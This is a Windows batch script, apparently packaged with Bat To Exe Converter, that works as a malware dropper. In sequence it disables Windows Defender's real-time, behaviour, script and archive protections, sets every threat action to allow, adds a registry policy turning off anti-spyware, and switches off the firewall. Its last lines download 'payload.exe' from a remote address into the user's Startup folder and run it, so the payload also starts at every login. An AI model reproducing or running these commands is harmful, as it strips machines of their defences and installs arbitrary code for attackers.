::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFEkEHVbVAE+1BaAR7ebv/NaUsRpQVfAsfYHa1vmDIfMH71fYfZoR+H9N2M0DAB9dbC6Pawkxp2pHpCmhPtSdsQPkB0WI9V81CVlQjnDRjic+LcRhlOcG1SWw+Ejt0rURyHTwX61AEHvkoQ==
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983

powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"

powershell.exe -command "Set-MpPreference -DisableBehaviorMonitoring $true"

powershell.exe -command "Set-MpPreference -DisableBlockAtFirstSeen $true"

powershell.exe -command "Set-MpPreference -DisableIOAVProtection $true"

powershell.exe -command "Set-MpPreference -DisablePrivacyMode $true"

powershell.exe -command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"
powershell.exe -command "Set-MpPreference -DisableArchiveScanning $true"

powershell.exe -command "Set-MpPreference -DisableIntrusionPreventionSystem $true"
powershell.exe -command "Set-MpPreference -DisableScriptScanning $true"
powershell.exe -command "Set-MpPreference -SubmitSamplesConsent 2"

powershell.exe -command "Set-MpPreference -MAPSReporting 0"
powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"
powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"
      
powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6"

powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"

powershell.exe -command "Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
powershell.exe -command "REG ADD “hklm\software\policies\microsoft\windows defender” /v DisableAntiSpyware /t REG_DWORD /d 1 /f"

powershell.exe -command "netsh advfirewall set allprofiles state off"

cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://192.168.1.12/payload.exe', '.\shiky.exe') }
shiky.exe